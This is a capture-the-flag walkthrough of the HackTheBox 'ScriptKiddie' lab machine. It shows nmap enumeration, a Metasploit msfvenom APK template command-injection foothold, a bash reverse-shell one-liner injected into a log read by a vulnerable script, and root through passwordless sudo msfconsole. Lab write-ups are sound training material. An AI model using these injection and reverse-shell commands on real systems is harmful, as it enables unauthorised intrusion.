---
title: HackTheBox - ScriptKiddie
date: 2021-06-23 13:21:10 +/- 0000
categories: [HackTheBox,Easy]
author: Connor Weeks-Pearson
tags: [scriptkiddie]
image: /assets/img/Icons/ScriptKiddie/script.png
---

This box was the first live box i've managed to root. Utilising metasploit to gain a foothold, and then writing a bash reverse shell into a file to elevate privileges, gaining root

**Key takeways:**

- Template command injection using metasploit
- Identifying and understanding vulnerabilities in bash scripts
- Writing a reverse shell bash script into target file

---

***Machine IP = 10.10.10.226***

## Enumeration

First things first, start out with an nmap scan of the host.

`nmap -sV -sC -T 5 10.10.10.226`

<pre>─$ nmap -sV -sC -T 5 10.10.10.226                                                                          130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 08:59 EDT
Nmap scan report for 10.10.10.226
Host is up (0.031s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
</pre>

As we can see, we have SSH on port 22, and a web server titled "k1d'5 h4ck3r t00l5". Lets take a look:

### Website

![Website](/assets/img/Icons/ScriptKiddie/scriptkiddiewebsite.png)

Initial thoughts are pointing me towards the file upload button, maybe we can upload a reverse shell?

---

## Foothold

After playing around with the site, and googling Linux template file upload vulnerabilities, i came accross a metasploit module on rapid7:

[Rapid 7 - msfvenom apk cmd injection](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/)

It outlines the steps as follows:

<pre>msf > use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
msf exploit(metasploit_msfvenom_apk_template_cmd_injection) > show targets
    ...targets...
msf exploit(metasploit_msfvenom_apk_template_cmd_injection) > set TARGET < target-id >
msf exploit(metasploit_msfvenom_apk_template_cmd_injection) > show options
    ...show and set options...
msf exploit(metasploit_msfvenom_apk_template_cmd_injection) > exploit</pre>

Where 
- RHOSTS = 10.10.10.226
- RPORT = 5000
- LHOST = 10.10.14.15
- RPORT = 5555

Running this module produced an APK with a reverse shell called msf.apk. As APK's are used for applications on android devices, we can attempt via the android OS option. Lets try and upload this to the webserver and connect back to our machine.

### Getting a shell

First, lets start our netcat listener on our host machine:

`nc -nvlp 5555`

<pre>
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nvlp 5555                 
listening on [any] 5555 ...
</pre>

and then upload the APK to the target machine via the website, with the OS set to android, and then press generate.

<pre>
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nvlp 5555                                                                                             
listening on [any] 5555 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.226] 50388
whoami
kid
</pre>

Boom! we have a reverse shell! now lets elevate it to an interactive shell using 

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

<pre>┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nvlp 5555                                                                                             1 ⨯
listening on [any] 5555 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.226] 50392
whoami
kid
python3 -c 'import pty; pty.spawn("/bin/bash")'
kid@scriptkiddie:~/html$ 
</pre>

### User.txt
Some quick searching lead to the first flag:
<pre>
kid@scriptkiddie:~$ more user.txt
more user.txt
***d05c9b66325f22*a4c59c75c*7a03
</pre>

---

## Priveledge Esculation

Looking around, it seems there is another user: `pwn`
In the directory is a file called `scanlosers.sh`. Lets take a look:

<pre>kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
</pre>

It looks as though the script is always being run, taking an ip from hackers and then running it, deleting the contents of hackers when it is finished. Maybe we can write a shell to the file?

After lots of trial and syntax errors, i finally got a shell using the following:

`echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.15/1234 0>&1'  #" > hackers`

Using the `;` to escape from recon/ and `#` to comment out everything after our script.

<pre>
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nvlp 1234                                                                                             
listening on [any] 1234 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.226] 33360
bash: cannot set terminal process group (870): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ whoami
whoami
pwn
</pre>

Great! Lets see what commands can be run by pwn

`sudo -l`

<pre>
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
</pre>

Looks as though we can run metasploit as root on pwn with no password needed!

<pre>
msf6 > whoami
[*] exec: whoami

root
</pre>

### Root.txt

<pre>
msf6 > cat root.txt
[*] exec: cat root.txt

***31120548006c2e8fc52d912365797
</pre>